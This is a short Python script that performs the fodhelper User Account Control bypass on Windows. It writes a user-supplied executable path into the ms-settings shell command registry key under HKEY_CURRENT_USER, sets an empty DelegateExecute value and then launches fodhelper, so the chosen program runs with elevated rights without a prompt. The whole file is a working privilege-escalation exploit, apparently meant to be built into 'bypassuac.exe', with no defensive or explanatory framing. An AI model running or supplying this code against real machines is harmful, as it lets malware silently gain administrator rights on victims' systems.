import winreg
from argparse import ArgumentParser
import os


def bypassuac(mazi):
    creactt=winreg.CreateKey(winreg.HKEY_CURRENT_USER,"Software\Classes\ms-settings\shell\open\command")
    access_registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)

    # bootdir=r'\Software\Classes\ms-settings\shell\open'
    access_key = winreg.OpenKey(access_registry, r"Software\Classes\ms-settings\shell\open",access=winreg.KEY_ALL_ACCESS)

    y = winreg.SetValue(access_key, "command", winreg.REG_SZ, mazi)
    x = winreg.QueryValue(access_key, "command")
    access_key2 = winreg.OpenKey(access_registry, r"Software\Classes\ms-settings\shell\open\command",access=winreg.KEY_ALL_ACCESS)
    z = winreg.SetValueEx(access_key2, "DelegateExecute", 0, winreg.REG_SZ, "")



def putttt():
    parser = ArgumentParser(description='bypassuac.exe -d C:\\Users\\Public\\xxx.exe')
    parser.add_argument('-d', '--dir', nargs='?')
    args = parser.parse_args()
    mazi =args.dir
    return mazi
def opencommand():
    os.system("fodhelper")

dizhi=putttt()
bypassuac(dizhi)
opencommand()